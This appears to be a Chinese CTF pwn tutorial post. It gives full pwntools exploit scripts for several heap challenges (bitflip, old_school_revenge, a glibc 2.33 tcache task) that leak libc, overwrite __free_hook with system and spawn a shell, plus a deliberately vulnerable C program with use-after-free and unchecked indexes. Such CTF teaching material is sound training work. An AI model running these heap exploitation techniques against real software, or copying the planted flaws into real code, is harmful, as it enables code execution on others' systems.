
```python
from pwn import \*
r=process('./bitflip')
#r=remote('124.71.130.185','49153')
#context.log\_level='debug'
libc=ELF('/lib/x86\_64-linux-gnu/libc.so.6')
one=[0x4f3d5,0x4f432,0x10a41c]
def add(idx,size):
r.recv()
r.sendline('1')
r.recv()
r.sendline(str(idx))
r.recv()
r.sendline(str(size))
def edit(idx,con):
r.recv()
r.sendline('2')
r.recv()
r.sendline(str(idx))
r.recv()
r.send(con)
def show(idx):
r.recv()
r.sendline('3')
r.sendlineafter("Index: ",str(idx))
def dele(idx):
r.recv()
r.sendline('4')
r.sendlineafter("Index: ",str(idx))
for i in range(9):
add(i,0x28)
for i in range(8):
dele(i)
add(15,'99999999'\*0xf0)
for i in range(8):
add(i,0x28)
show(7)
r.recvuntil("Content: ")
leak=u64(r.recv(6)+'\x00'\*2)
print(hex(leak))
base=leak-0x3ebcc0
print(hex(base))
for i in range(9,16):
add(i,0x18)
for i in range(16,23):
add(i,0x28)
add(23,0x18)
add(24,0x28)
add(25,0x18)
add(26,0x18)
for i in range(9,16):
dele(i)
for i in range(16,23):
dele(i)
dele(25)
edit(23,'a'\*0x18+'\x51')
gdb.attach(r)
dele(24)
raw\_input()
add(9,0x48)
free=base+libc.sym["\_\_free\_hook"]
edit(9,p64(0)\*5+p64(0x21)+p64(free-0x10)+'a'\*0x10+'\x21')
for i in range(10,17):
add(i,0x18)
add(17,0x18)
add(18,0x18)
sys=base+libc.sym['system']
edit(17,'/bin/sh\x00\n')
edit(18,p64(sys)+'\n')
dele(17)
r.interactive()
```

# old_school_revenge

off by null 也是套路，修改`prevsize`向上合并，细节方面没什么要考究的，就是个大小计算，其他的看视频看多几次就好了

## EXP
```python
from pwn import \*
r=process('./old\_school\_revenge')
#r=remote('123.60.63.39','49153')
libc=ELF('/lib/x86\_64-linux-gnu/libc.so.6')
def add(idx,size):
r.recv()
r.sendline('1')
r.recv()
r.sendline(str(idx))
r.recv()
r.sendline(str(size))
def edit(idx,con):
r.recv()
r.sendline('2')
r.recv()
r.sendline(str(idx))
r.recv()
r.sendline(con)
def show(idx):
r.recv()
r.sendline('3')
r.recv()
r.sendline(str(idx))
def dele(idx):
r.recv()
r.sendline('4')
r.recv()
r.sendline(str(idx))
o\_g = [0x4f2c5,0x4f322,0x10a38c]
l64 = lambda :u64(r.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda :u32(r.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
sla = lambda a,b :r.sendlineafter(str(a),str(b))
sa = lambda a,b :r.sendafter(str(a),str(b))
lg = lambda name,data : r.success(name + ": 0x%x" % data)
se = lambda payload: r.send(payload)
sl = lambda payload: r.sendline(payload)
ru = lambda a :r.recvuntil(str(a))
for i in range(7):
add(i,0xf8)
add(7,0xf8)#7
add(8,0x88)#8
add(9,0xf8)#9
add(10,0x88)#10
for i in range(7):
dele(i)
dele(8)
dele(7)
add(11,0x88)
edit(11,"a"\*0x80+p64(0x90+0x100))
dele(9)
for i in range(7):
add(i,0xf8)
edit(i,"/bin/sh\x00")
add(12,0xf8)
show(12)
libc\_base = l64()-0x3ebf20
lg("libc\_base",libc\_base)
free=libc\_base+libc.sym['\_\_free\_hook']
sys=libc\_base+libc.sym['system']
add(13,0x88)
dele(0)
dele(9)
add(14,0x88)
dele(11)
edit(13,p64(free)+'\n')
add(22,0x88)
edit(22,'/bin/sh\x00')
add(23,0x88)
edit(23,p64(sys))
dele(22)
r.interactive()
```

# 第七天附件

附件：

链接：<mark class="encrypted">aaeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4e0h3k6E0M7X3V1K6e0p5S2t1K9@1V1H3c8g2A6E0g2Y4u0c8k6p5I4#2b7g2)9K6c8Y4m8%4k6q4)9K6c8r3^5J5P5h3b7`.</mark>

提取码：n2yd

--来自百度网盘超级会员V3的分享

# 第八天

## 前言

今天东西就一个，2.33版本的堆申请，2.34的题我想讲，奈何太菜了，没找到相关资料（今年湖湘杯的线上赛题目我没保存，有一道是2.34，祭），`how2heap`上面的话有点抽象看的。我要是学会了，就会来更新。

（痛苦面具，HWS又改线上了┭┮﹏┭┮ o(╥﹏╥)o）

## b站up主推荐

星盟，国资社畜(你有多想pwn)

## 2.33堆申请规则

先形成`tcache`然后第一个`tcache`的`fd`位存放着`tcache chunk`地址的左移12位数值，这个值就是整个程序的异或`key`

其余的堆下次申请地址的时候都会和这个`key`异或一次。

### 源码
```c
#include<stdio.h>
#include<stdlib.h>
char \*heaparray[24];
int num=0;
void init()
{
setvbuf(stdin, 0LL, 2, 0LL);
setvbuf(stdout, 0LL, 2, 0LL);
setvbuf(stderr, 0LL, 2, 0LL);
}
void create\_heap() {
int i;
for (i = 0; i < 24; i++) {
if (!heaparray[i]) {
heaparray[i] = (char \*)malloc(0x90);
if (!heaparray[i]) {
puts("error");
exit(2);
}
puts("over\n");
num++;
break;
}
}
}
void delete\_heap() {
int idx;
char buf[4];
puts("idx");
read(0, buf, 4);
idx = atoi(buf);
if (idx < 0 || idx >= 24) {
puts("error");
exit(0);
}
if (heaparray[idx]) {
free(heaparray[idx]);
puts("over\n");
num--;
} else {
puts("error\n");
}
}
void show\_item() {
int i;
int idx;
char buf[4];
puts("idx");
(read(0, buf, 4));
idx = atoi(buf);
if (!heaparray[idx]) {
puts("no hvae things\n");
} else {
printf("Content:");
printf("%s",heaparray[idx]);
}
}
void edit\_item(){
int i;
int idx;
char buf[4];
puts("idx");
(read(0, buf, 4));
idx = atoi(buf);
if (!heaparray[idx]) {
puts("no hvae things\n");
} else {
puts("Content:");
read(0,heaparray[idx], 0x90);
}
}
void menu()
{
puts("1. Get a page");
puts("2. Take out");
puts("3. Read page");
puts("4. edit a page");
}
void main()
{
init();
int i;
while(1)
{
menu();
scanf("%d",&i);
switch(i)
{
case 1:create\_heap();break;
case 2:delete\_heap();break;
case 3:show\_item();break;
case 4:edit\_item();break;
default:puts("error");break;
}
}
}
```

### exp
```python
#encoding=utf-8
#patchelf --set-interpreter ./glibc-all-in-one/libs/2.33-0ubuntu5\_amd64/ld-2.33.so --set-rpath ./glibc-all-in-one/libs/2.33-0ubuntu5\_amd64 newyearbook
from pwn import \*
r=process('./pwn')
context.log\_level='debug'
libc=ELF('/home/q/Desktop/glibc-all-in-one/libs/2.33-0ubuntu5\_amd64/libc.so.6')
def add():
r.sendlineafter("4. edit a page\n",str(1))
def dele(idx):
r.sendlineafter("4. edit a page\n",str(2))
r.sendlineafter("idx\n",str(idx))
def show(idx):
r.sendlineafter("4. edit a page\n",str(3))
r.sendlineafter("idx\n",str(idx))
def edit(idx,con):
r.sendlineafter("4. edit a page\n",str(4))
r.sendlineafter("idx\n",str(idx))
r.sendafter("Content:",con)
for i in range(10):
add()
for i in range(9):
dele(i)
show(0)
r.recvuntil("Content:")
heap1=u64(r.recv(5)+b'\x00'\*3)
print(hex(heap1))
edit(7,'\xa0')
show(7)
r.recvuntil("Content:")
libc=u64(r.recv(6)+b'\x00'\*2)-0x1e0ca0
print(hex(libc))
system= libc+0x04fa60
f\_hook = libc+0x1e3e20
real=((f\_hook^heap1))
print (hex(real))
edit(7,'\x00')
edit(6,p64(real))
add()
add()
edit(10,"/bin/sh\x00")
edit(11,p64(system))
dele(10)
#gdb.attach(r)
r.interactive()
```

# 第八天附件

附件：

链接：<mark class="encrypted">cf6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4x3e0k6Y4z5i4S2Z5L8V1I4A6M7p5q4c8e0%4y4K6K9V1N6x3z5h3k6%4b7g2)9K6c8Y4m8%4k6q4)9K6c8s2N6X3k6%4V1`.</mark>

提取码：wfgy

--来自百度网盘超级会员V3的分享

# 第九天附件

链接：<mark class="encrypted">ebaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4L8r3W2C8h3h3W2$3K9%4g2G2e0V1k6K9L8f1k6X3e0p5k6n7f1i4S2F1N6#2)9K6c8Y4m8%4k6q4)9K6c8s2k6$3N6s2p5`.</mark>

提取码：vvtq

--来自百度网盘超级会员V4的分享

## 全部文件集合-2023-09-07 链接：[074K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4d9$3#2&6d9X3R3@1P5g2A6s2d9f1N6#2z5h3W2D9e0$3W2k6b7i4k6U0k6#2)9K6c8Y4m8%4k6q4)9K6c8r3g2G2k6e0j5`.](https://bbs.kanxue.com/elink@409K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4d9$3#2&6d9X3R3@1P5g2A6s2d9f1N6#2z5h3W2D9e0$3W2k6b7i4k6U0k6#2)9K6c8Y4m8%4k6q4)9K6c8r3g2G2k6e0j5`.) 提取码：eoe6 --来自百度网盘超级会员V5的分享

# 前言

做这赛棍速成，其实就是图一乐，真想几天完成是不可能的啦，除非你有一定的基础，不过嘛

我自己学到的东西就这么多了从21-2-1到21-12-1就学了这些了。

--license--

1.课程全开源 全免费。

2.本课程仅供交流学习，不得用于任何盈利目的，并且因为个人原因使用，转载本课程造成的所有损失及法律责任均由使用者个人负责。

我也不知道我把这些自己录的课程发出来后会不会被人喷说误人子弟，违背ctf初心,但是我只是做一个自己所学的知识分享，希望有错误的地方可以指正我。

还有就是，不太习惯录制视频，视频可能看起来说话会很快让人很难受，前三天的视频我是不打算重做修改的了，第四天开始我会慢慢做的，从第四天开始就是堆的内容了，不要问我为什么不讲格式化字符串，因为这个东西用的少是一点，其实我自己玩的也不熟，就不来坑人了。

# （每一天的附件都包含了题目源码和视频）

---

# 今天是20221月18进行第二次更新，更新到第四天

# 更新频率可能是2-3天一更，也不一定但是不会变成弃坑和随缘更 希望师傅们可以把一些想法留在评论区交流，视频的语速，表意，第四天已经把语速尽量放慢了

---

# 今天是2022 1月23日现在2:32分，更新到了第五天，最近烦心事比较多，视频里有点吐槽，还有说关于堆沙盒获取未知文件名那块可能将的不是很清楚，最近打了hgame感觉题目还是挺有学习价值的，就打算等这一周的hgame结束然后放下解出来的pwn的wp

---

# 今天是2022年1月27日，今天主要讲下hgame的几个pwn题，hws的题我直接写在附件里面了，更新时间可能一周1-2更吧，我最近跑去刷LeetCode了，从菜鸡开始，pwn这里我尽力把所有学到的东西做再跑路，这两天因为比赛的事情心态也有点裂开，所以视频讲的可能质量大不如前，但是我尽力了，没有摆烂啦，第七天的课程我会讲下off by xx的堆利用专题

---

---

# 今天是2月9日摆烂了好几天了，我之后可能不会更新ctf相关的了。已经半退圈了，只有有一些必要赛要打，我没什么墨水，也教不了大家太多的东西，只希望看见的人能有所收获就是本课程的初衷了

附件：
